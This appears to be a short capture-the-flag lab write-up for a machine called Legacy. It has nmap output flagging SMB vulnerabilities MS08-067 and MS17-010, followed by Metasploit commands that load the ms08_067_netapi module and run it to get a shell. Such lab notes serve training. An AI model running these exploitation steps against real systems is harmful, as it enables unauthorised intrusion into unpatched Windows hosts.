----------------------------------------------------
# Author -> Shubham Rannpise
----------------------------------------------------
# Legacy
# 16/3/2023
10.10.10.4

----------------------------------------------------
# nmap
----------------------------------------------------
PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds
| smb-vuln-ms08-067: 
|   VULNERABLE:
| smb-vuln-ms17-010: 
|   VULNERABLE:

----------------------------------------------------
# exploitation
----------------------------------------------------
└─$ msfconsole  
msf6 > search ms08-067
use windows/smb/ms08_067_netapi
set options
run 
bingo we hot shell
